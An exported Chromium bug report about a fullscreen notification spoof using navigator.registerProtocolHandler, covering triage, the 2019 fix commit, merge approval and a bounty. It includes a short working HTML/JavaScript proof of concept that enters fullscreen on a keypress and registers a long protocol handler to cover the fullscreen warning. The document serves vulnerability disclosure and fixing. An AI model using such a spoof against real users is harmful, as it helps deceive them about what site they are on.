# Security: fullscreen notification spoof (registerProtocolHandler)

| Field | Value |
|-------|-------|
| **Issue ID** | [40092424](https://issues.chromium.org/issues/40092424) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | UI>Browser>FullScreen |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | ma...@gmail.com |
| **Assignee** | av...@chromium.org |
| **Created** | 2018-09-11 |
| **Bounty** | $1,000.00 |

## Description

**VERSION**  

Chrome Version: chrome69  

Operating System: windows7

online demo:<http://f.3cm.me/r/p_spoof.html>  

abuse navigator.registerProtocolHandler function to overlay the notification

## Attachments

- [protocal_spoof.gif](attachments/protocal_spoof.gif) (image/gif, 44.8 KB)

## Timeline

### ma...@gmail.com (2018-09-11)

the nofication UI should be on the top of permission request UI

### rs...@chromium.org (2018-09-11)

[Empty comment from Monorail migration]

[Monorail components: UI>Browser>FullScreen UI>Browser>Payments]

### rs...@chromium.org (2018-09-11)

[Empty comment from Monorail migration]

[Monorail components: -UI>Browser>Payments]

### sh...@chromium.org (2018-09-25)

avi: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### me...@chromium.org (2018-10-05)

POC in case the site becomes inaccessible: 

-----------------------------
press any key
<script>
function pwn()
{
	document.documentElement.webkitRequestFullScreen();
    navigator.registerProtocolHandler('web+mooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo', '123%s', 'title');
}
</script>
<body onkeydown="pwn();">
</body>
-----------------------------

Avi, have you had a chance to look at this one? Looks like this is another dialog type that should kick out of fullscreen.

### sh...@chromium.org (2018-10-09)

avi: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### av...@chromium.org (2018-11-13)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-12-05)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-01-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-03-13)

[Empty comment from Monorail migration]

### li...@chromium.org (2019-04-01)

Friendly security sheriff ping. Any updates on this? Thanks for your help!

### sh...@chromium.org (2019-04-24)

[Empty comment from Monorail migration]

### dr...@chromium.org (2019-05-31)

Friendly security sheriff ping - any update on this? Are you able to reproduce the bug?

### sh...@chromium.org (2019-06-05)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-07-01)

avi@, friendly ping from the security marshal. Could you please take a look?

### sh...@chromium.org (2019-07-31)

[Empty comment from Monorail migration]

### jd...@chromium.org (2019-08-14)

avi@, any movement on this?

We're trying to close out some of the older security UI bugs, and I'd love to have this among them.

### av...@chromium.org (2019-08-14)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-08-14)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/ced52b64ad98944dc3881a230612c18dace05790

commit ced52b64ad98944dc3881a230612c18dace05790
Author: Avi Drissman <avi@chromium.org>
Date: Wed Aug 14 21:25:46 2019

Drop fullscreen when protocol registration dialogs shown.

BUG=882812

Change-Id: Ie880fdd1485f7860e1bc8d3133162d87cfb7a642
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1753592
Reviewed-by: Sidney San Martín <sdy@chromium.org>
Commit-Queue: Avi Drissman <avi@chromium.org>
Cr-Commit-Position: refs/heads/master@{#687012}

[modify] https://crrev.com/ced52b64ad98944dc3881a230612c18dace05790/chrome/browser/ui/browser.cc
[modify] https://crrev.com/ced52b64ad98944dc3881a230612c18dace05790/content/browser/web_contents/web_contents_impl.cc
[modify] https://crrev.com/ced52b64ad98944dc3881a230612c18dace05790/content/browser/web_contents/web_contents_impl.h
[modify] https://crrev.com/ced52b64ad98944dc3881a230612c18dace05790/content/public/browser/web_contents.h


### sh...@chromium.org (2019-08-15)

[Empty comment from Monorail migration]

### na...@google.com (2019-08-19)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-08-20)

Requesting merge to beta M77 because latest trunk commit (687012) appears to be after beta branch point (681094).

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-08-20)

This bug requires manual review: M77 has already been promoted to the beta branch, so this requires manual review
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://goto.google.com/chrome-release-branch-merge-guidelines
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on master/ToT?
4. Why are these changes required in this milestone after branch?
5. Is this a new feature?
6. If it is a new feature, is it behind a flag using finch?

Please contact the milestone owner if you have questions.
Owners: benmason@(Android), kariahda@(iOS), dgagnon@(ChromeOS), lakpamarthy@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### na...@google.com (2019-08-21)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2019-08-21)

Congrats! The Panel decided to reward $1,000 for this report!

### na...@google.com (2019-08-21)

[Empty comment from Monorail migration]

### la...@google.com (2019-08-23)

avi@ - please respond to C#23 to consider the merge request

### av...@google.com (2019-08-23)

It’s a pretty simple merge, to close a possible hole. It’s more theoretical and I don’t believe has been seen in the wild, so I’m OK either way.

### la...@google.com (2019-08-24)

Okay, let's take the change.

merge approved for M77 branch 3865

### av...@chromium.org (2019-08-26)

done.

### la...@google.com (2019-09-03)

This request for M77 merge is already approved. Please land your changes into M77 branch (3865) today. We are one week away from Stable and doing the final Beta tomorrow.

### av...@chromium.org (2019-09-03)

This was merged to 3865 on https://chromium-review.googlesource.com/c/chromium/src/+/1769511 . I don’t know why the bot didn’t pick it up.

### la...@google.com (2019-09-03)

dropping the Merge-Approved-77 label 

### av...@chromium.org (2019-09-03)

Manually noting the merge.

### ad...@google.com (2019-09-09)

[Empty comment from Monorail migration]

### ad...@chromium.org (2019-09-09)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-11-21)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@chromium.org (2019-11-23)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/882812?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40092424)*
